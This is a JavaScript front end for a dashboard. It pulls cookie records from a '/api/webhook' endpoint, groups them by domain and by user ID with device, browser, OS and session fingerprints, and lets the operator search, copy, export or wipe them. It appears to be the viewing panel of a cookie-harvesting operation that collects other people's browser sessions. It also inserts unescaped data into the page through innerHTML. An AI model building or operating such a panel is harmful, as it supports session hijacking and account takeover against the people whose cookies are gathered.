let currentCookies = [];
let domainFilter = '';
let userFilter = '';
let searchQuery = '';

// DOM Elements
const webhookList = document.getElementById('webhookList');
const copiedToast = document.getElementById('copiedToast');
const refreshBtn = document.getElementById('refreshBtn');
const searchInput = document.getElementById('searchInput');
const domainFilterSelect = document.getElementById('domainFilter');
const userFilterSelect = document.getElementById('userFilter');
const totalCookiesElement = document.getElementById('totalCookies');
const activeDomainsElement = document.getElementById('activeDomains');
const clearDataBtn = document.getElementById('clearData');
const exportDataBtn = document.getElementById('exportData');

// Get browser information
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = "Unknown";
    let browserVersion = "";
    
    if (ua.indexOf("Chrome") > -1) {
        browserName = "Chrome";
        browserVersion = ua.match(/Chrome\/([0-9.]+)/)[1];
    } else if (ua.indexOf("Firefox") > -1) {
        browserName = "Firefox";
        browserVersion = ua.match(/Firefox\/([0-9.]+)/)[1];
    } else if (ua.indexOf("Safari") > -1) {
        browserName = "Safari";
        browserVersion = ua.match(/Version\/([0-9.]+)/)[1];
    } else if (ua.indexOf("Edge") > -1) {
        browserName = "Edge";
        browserVersion = ua.match(/Edge\/([0-9.]+)/)[1];
    }
    
    return `${browserName}${browserVersion.split('.')[0]}`;
}

// Get device type
function getDeviceType() {
    const ua = navigator.userAgent;
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
        return "Tablet";
    } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
        return "Mobile";
    }
    return "Desktop";
}

// Get OS information
function getOSInfo() {
    const ua = navigator.userAgent;
    let os = "Unknown";
    
    if (ua.indexOf("Win") > -1) os = "Win";
    else if (ua.indexOf("Mac") > -1) os = "Mac";
    else if (ua.indexOf("Linux") > -1) os = "Linux";
    else if (ua.indexOf("Android") > -1) os = "Android";
    else if (ua.indexOf("iOS") > -1) os = "iOS";
    
    return os;
}

// Calculate session duration
function getSessionDuration(timestamp) {
    const now = Date.now();
    const duration = now - timestamp;
    const hours = Math.floor(duration / (1000 * 60 * 60));
    const minutes = Math.floor((duration % (1000 * 60 * 60)) / (1000 * 60));
    return `${hours}h${minutes}m`;
}

// Format user ID for display
function formatUserId(userId) {
    // Check if it's already a formatted ID
    if (typeof userId === 'string' && userId.includes('|')) {
        const parts = userId.split('|');
        if (parts.length >= 6) {
            const [device, browser, os, location, session, timestamp] = parts;
            const date = new Date(parseInt(timestamp));
            const sessionDuration = getSessionDuration(parseInt(timestamp));

            return {
                mainInfo: `${device} | ${browser} | ${sessionDuration}`,
                details: [
                    { icon: 'devices', label: 'Device', value: device },
                    { icon: 'web', label: 'Browser', value: browser },
                    { icon: 'computer', label: 'OS', value: os },
                    { icon: 'location_on', label: 'Location', value: location },
                    { icon: 'timer', label: 'Session', value: session },
                    { icon: 'schedule', label: 'Started', value: date.toLocaleString() },
                    { icon: 'hourglass_top', label: 'Duration', value: sessionDuration }
                ]
            };
        }
    }
    
    // Generate new format for old IDs
    const device = getDeviceType();
    const browser = getBrowserInfo();
    const os = getOSInfo();
    const location = "Unknown";
    const session = Math.random().toString(36).substr(2, 9);
    const timestamp = Date.now();
    
    const newUserId = `${device}|${browser}|${os}|${location}|${session}|${timestamp}`;
    
    return {
        mainInfo: `${device} | ${browser} | 0h0m`,
        details: [
            { icon: 'devices', label: 'Device', value: device },
            { icon: 'web', label: 'Browser', value: browser },
            { icon: 'computer', label: 'OS', value: os },
            { icon: 'location_on', label: 'Location', value: location },
            { icon: 'timer', label: 'Session', value: session },
            { icon: 'schedule', label: 'Started', value: new Date(timestamp).toLocaleString() },
            { icon: 'hourglass_top', label: 'Duration', value: '0h0m' }
        ]
    };
}

// Render cookies to the list
function renderCookies() {
    console.log('Rendering cookies:', currentCookies);
    const filteredCookies = getFilteredCookies();
    
    webhookList.innerHTML = filteredCookies.map(item => `
        <div class="webhook-item" data-id="${item.id}">
            <div class="webhook-header">
                <div class="domain-name">
                    <span class="material-icons">public</span>
                    ${item.body.url || 'Unknown Domain'}
                </div>
                <div class="webhook-time">
                    ${new Date(item.time).toLocaleString()}
                </div>
            </div>
            <div class="webhook-info">
                <div class="info-item">
                    <span class="material-icons">cookie</span>
                    ${item.cookieCount} cookies
                </div>
                <div class="info-item">
                    <span class="material-icons">person</span>
                    User ID: ${item.userId}
                </div>
            </div>
            <div class="webhook-content">
                <pre class="json-content">${JSON.stringify(item, null, 2)}</pre>
                <button class="copy-button" title="Copy JSON">
                    <span class="material-icons">content_copy</span>
                </button>
            </div>
        </div>
    `).join('');

    // Add click event listeners
    document.querySelectorAll('.webhook-item').forEach(item => {
        const content = item.querySelector('.webhook-content');
        const copyButton = item.querySelector('.copy-button');

        // Toggle content on item click
        item.addEventListener('click', (e) => {
            // Don't toggle if clicking copy button
            if (e.target.closest('.copy-button')) return;
            
            // Toggle expanded class
            content.classList.toggle('expanded');
            
            // Close other expanded items
            document.querySelectorAll('.webhook-content.expanded').forEach(el => {
                if (el !== content) {
                    el.classList.remove('expanded');
                }
            });
        });

        // Copy button click handler
        copyButton.addEventListener('click', (e) => {
            e.stopPropagation();
            const jsonContent = item.querySelector('.json-content').textContent;
            navigator.clipboard.writeText(jsonContent).then(() => {
                copiedToast.style.display = 'block';
                setTimeout(() => {
                    copiedToast.style.display = 'none';
                }, 2000);
            });
        });
    });
}

// Fetch cookies from the API
async function fetchCookies() {
    try {
        console.log('Fetching cookies...');
        const response = await fetch('/api/webhook');
        const data = await response.json();
        console.log('Fetched data:', data);
        currentCookies = data;
        updateFilters();
        renderCookies();
        updateStats();
    } catch (error) {
        console.error('Error fetching cookies:', error);
    }
}

// Update filter options
function updateFilters() {
    const domains = [...new Set(currentCookies.map(item => item.body.url || 'Unknown Domain'))];
    const users = [...new Set(currentCookies.map(item => item.userId))];

    // Update domain filter
    const currentDomain = domainFilterSelect.value;
    domainFilterSelect.innerHTML = '<option value="">All Domains</option>' +
        domains.map(domain => `<option value="${domain}" ${domain === currentDomain ? 'selected' : ''}>${domain}</option>`).join('');

    // Update user filter
    const currentUser = userFilterSelect.value;
    userFilterSelect.innerHTML = '<option value="">All Users</option>' +
        users.map(user => `<option value="${user}" ${user === currentUser ? 'selected' : ''}>${user}</option>`).join('');
}

// Update statistics
function updateStats() {
    const filteredCookies = getFilteredCookies();
    const totalCookies = filteredCookies.reduce((sum, item) => sum + item.cookieCount, 0);
    const domains = new Set(filteredCookies.map(item => item.body.url || 'Unknown Domain'));

    totalCookiesElement.textContent = totalCookies;
    activeDomainsElement.textContent = domains.size;
}

// Get filtered cookies based on current filters and search
function getFilteredCookies() {
    return currentCookies.filter(item => {
        const matchesDomain = !domainFilter || item.body.url === domainFilter;
        const matchesUser = !userFilter || item.userId === userFilter;
        const matchesSearch = !searchQuery || 
            item.body.url.toLowerCase().includes(searchQuery.toLowerCase()) ||
            item.userId.toString().includes(searchQuery);
        return matchesDomain && matchesUser && matchesSearch;
    });
}

// Event Listeners
refreshBtn.addEventListener('click', fetchCookies);

searchInput.addEventListener('input', (e) => {
    searchQuery = e.target.value;
    renderCookies();
    updateStats();
});

domainFilterSelect.addEventListener('change', (e) => {
    domainFilter = e.target.value;
    renderCookies();
    updateStats();
});

userFilterSelect.addEventListener('change', (e) => {
    userFilter = e.target.value;
    renderCookies();
    updateStats();
});

clearDataBtn.addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all data?')) {
        try {
            await fetch('/api/webhook', { method: 'DELETE' });
            currentCookies = [];
            renderCookies();
            updateStats();
            updateFilters();
        } catch (error) {
            console.error('Error clearing data:', error);
        }
    }
});

exportDataBtn.addEventListener('click', () => {
    const dataStr = JSON.stringify(currentCookies, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `cookie-data-${new Date().toISOString().split('T')[0]}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
});

// Initial load
fetchCookies();

// Auto refresh every 30 seconds
setInterval(fetchCookies, 30000); 